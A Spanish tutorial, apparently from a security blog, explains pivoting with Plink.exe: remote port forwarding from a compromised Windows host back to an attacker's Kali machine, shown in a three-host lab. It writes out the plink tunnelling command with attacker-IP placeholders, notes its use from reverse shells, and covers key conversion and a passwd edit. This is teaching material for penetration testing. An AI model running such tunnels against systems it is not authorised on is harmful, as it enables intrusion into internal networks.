---
id: "como-hacer-pivoting-con-plink"
title: "Cómo hacer Pivoting con Plink.exe"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2021-11-06
updatedDate: 2021-11-06
image: "https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-0.webp"
description: "Aprende a usar Plink.exe, la versión de línea de comandos de PuTTY, para realizar Remote Port Forwarding en sistemas Windows antiguos sin cliente SSH incorporado."
categories:
  - "windows"
draft: false
featured: false
lang: "es"
---

Plink.exe es la versión para línea de comandos de PuTTY SSH Client. En los Windows más recientes, ya hay un cliente SSH incorporado por lo que no es muy útil plink, sin embargo, sí que lo es para los sistemas más antiguos los cuales no tienen este cliente SSH.

Podemos encontrar el binario de plink normalmente en la ruta:

```bash
/usr/share/windows-resources/binaries/plink.exe
```

Si no, se puede descargar desde la [web oficial de PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html).

Siendo plink.exe un cliente SSH, lo único que podemos hacer es un **Remote Port Forwarding**. En el post de SSH ya se comentó el peligro que tiene esto, básicamente de esta forma estás escribiendo las credenciales de tu equipo en una máquina que no es tuya, por lo que hay que tener cuidado (también se puede hacer uso de claves asimétricas).

El comando para usar plink.exe es el siguiente:

```bash
cmd.exe /c echo y | plink.exe -l <usuario> -pw <contraseña> <ip mia de atacante> -R <puerto que abrimos en mi maquina atacante>:<host de quien queremos tunelizar>:<puerto que queremos tunelizar>
```

Transferiríamos plink a la máquina Windows y ejecutaríamos el comando desde ahí.

La primera parte del comando: `cmd.exe /c echo y`, sirve para en las shells no interactivas (como es la mayoría de reverse shells en sistemas Windows), poder aceptar el mensaje de precaución que lanza plink por defecto.

Por lo demás, el resto del comando se entiende fácil si ya se ha tocado Remote Port Forwarding, si no, recomiendo visitar el post de [Pivoting con SSH](https://blog.deephacking.tech/es/posts/como-hacer-pivoting-con-ssh/).

Además de esto, algunos parámetros útiles que podemos agregar en plink son los siguientes:

- `-g` --\> permite que otros clientes de la LAN puedan conectarse al puerto que se abre en la máquina atacante. Por defecto solo se puede en local.
- `-f` --\> plink se va al segundo plano una vez se ha establecido la sesión SSH de forma exitosa.
- `-N` --\> indicamos que no ejecute una shell, simplemente que se conecte (esto no significa que el proceso se mande al segundo plano), es decir, quedaría así:

![Plink ejecutándose con parámetro -N](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-1.avif)

Es bastante recomendable usar los parámetros `-f` y `-N`.

- `-i` --\> permite indicar una clave privada. Sin embargo, hay que hacer una conversión, ya que plink no va a entender el formato por defecto que nos deja ssh-keygen. Una vez tenemos generada la clave privada con ssh-keygen, seguimos los siguientes pasos:

Instalamos las tools de putty:

```bash
sudo apt install putty-tools
```

Una vez instaladas, hacemos uso de puttygen:

```bash
puttygen <clave privada> -o <nueva clave privada>.ppk
```

De esta forma, esta nueva clave privada que tenemos si la entenderá plink y podremos usarla.

Con todo esto explicado, vamos a hacer una prueba en el siguiente laboratorio:

- 3 Equipos
  - Kali
    - IP: 192.168.10.10
  - Windows 7
    - IP: 192.168.10.40 y 192.168.20.40 --\> 2 Interfaces de Red
  - Debian --\> Servidor Web y SSH - Puerto 22 y 80 activados
    - IP: 192.168.20.20

![Diagrama del laboratorio de pivoting con Plink](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-2.avif)

OJO: de cara al Remote Port Forwarding, recomiendo hacer un cambio simple de contraseña en el passwd.

![Edición del archivo passwd](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-3.avif)

Para quien no conozca esto, básicamente puedes generar una contraseña en DES UNIX con openssl:

![Generación de contraseña con openssl](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-4.avif)

Si cogemos esta contraseña generada y la sustituimos en el passwd por la "`x`", la contraseña del usuario será la que hemos puesto en openssl, en este caso "`hola`", cuando se quiera volver a la contraseña anterior simplemente en el passwd se quita lo escrito y se vuelve a poner la "`x`".

Con esto hecho, nos dirigimos al Windows y usamos plink como se indicaba en el comando escrito previamente:

```bash
cmd.exe /c echo y | plink.exe -l <usuario> -pw <contraseña> <ip mia de atacante> -R <puerto que abrimos en mi maquina atacante>:<host de quien queremos tunelizar>:<puerto que queremos tunelizar>
```

![Ejecución de Plink con múltiples puertos tunelizados](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-5.avif)

Si nos fijamos hay dos puntos importantes aquí:

1. Podemos tunelizar tantos puertos como queramos, siempre usando el parámetro `-R`.
2. Al tunelizar un puerto SSH, tenemos que indicarle otro puerto a utilizar/abrir en nuestra máquina que no sea el 22, ya que este ya se está empleando.

De esta forma, ya tenemos ambos puertos tunelizados, en este caso el 22 (el 2222 en nuestra máquina) y el 80:

![Verificación de puertos tunelizados](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-6.avif)

![Acceso exitoso al servidor web tunelizado](https://cdn.deephacking.tech/i/posts/como-hacer-pivoting-con-plink/como-hacer-pivoting-con-plink-7.avif)

Plink es una herramienta que poco a poco se irá quedando en desuso por la implementación por defecto del cliente SSH en los sistemas Windows. Sin embargo, en ciertas ocasiones donde estemos lidiando con algún que otro sistema antiguo, nos puede venir bastante bien.
